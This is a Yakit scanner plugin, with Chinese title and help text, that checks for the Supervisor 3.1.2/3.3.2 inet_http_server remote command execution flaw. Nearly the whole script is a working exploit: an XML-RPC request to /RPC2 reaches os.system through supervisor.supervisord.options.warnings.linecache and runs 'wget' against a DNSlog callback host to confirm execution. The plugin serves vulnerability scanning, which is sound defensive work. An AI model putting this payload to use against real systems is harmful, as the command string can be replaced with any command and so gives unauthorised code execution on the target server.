script_name: Supervisord inet_http_server 远程命令执行漏洞
content:
yakit.AutoInitYakit()

handleCheck = func(target,port){
    var url
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    level=["","low","middle","high","critical"]
    if isTls {
        url="https://"+addr
    }else{
        url="http://"+addr
    }
    vulnable=false

    reference="Supervisord inet_http_server 远程命令执行漏洞"
    severity="middle"
    type="漏洞"
    rand_Payload=str.RandStr(10)
    server,token,err = risk.NewDNSLogDomain()
    die(err)
    yakit.Info("dnslog server addr: %v ",server)
    yakit.Info("dnslog server check token: %v", token)

    reverseURL =  "http://"+rand_Payload+"."+server

    poc_url_r0= url + `/RPC2`
    req_r0, _ := http.NewRequest("POST",poc_url_r0,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),
    http.body(`<?xml version="1.0"?>
      <methodCall>
      <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
      <params>
      <param>
      <string>wget `+ parseStr(reverseURL) +`</string>
      </param>
      </params>
      </methodCall>`),)
    breq,_=http.dump(req_r0)
    resp_r0, err := http.Do(req_r0)
    die(err)
    bresp,_=http.dump(resp_r0)
    header, body = poc.Split(bresp)
    r0_flag = false
    sleep(3)
    detail, _ := risk.CheckDNSLogByToken(token)
    if resp_r0.StatusCode == 200 && len(detail) > 0 && str.Contains(string(detail),rand_Payload.Lower()){
        r0_flag = true
    }

    poc_url=poc_url_r0
    if r0_flag{
        vulnable = true
    }
    if vulnable {
            yakit.Info("FOUND INFO for %v %v",reference,type)
            risk.NewRisk(
                url, risk.severity(severity), 
                risk.title(sprintf("FOUND %v %v",reference,type)),
                risk.titleVerbose(sprintf("%v %v",reference,type)),
                risk.type(type), risk.typeVerbose(type),
                risk.details({
                    "request": breq,
                    "response": bresp,
                    "url": poc_url,
                }),
            )
        }
    return
}
handle = func(result) {
    if !result.IsOpen(){
        return
    }
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
}
help: 以下通报描述了Supervisor 3.1.2版和Supervisor 3.3.2版中经过认证的远程执行代码漏洞。Supervisor是一种客户机/服务器系统，它允许用户在类似Unix的操作系统上监视和控制多个进程，用于控制与项目或客户相关的进程，并意味着在启动时像任何其他程序一样启动。
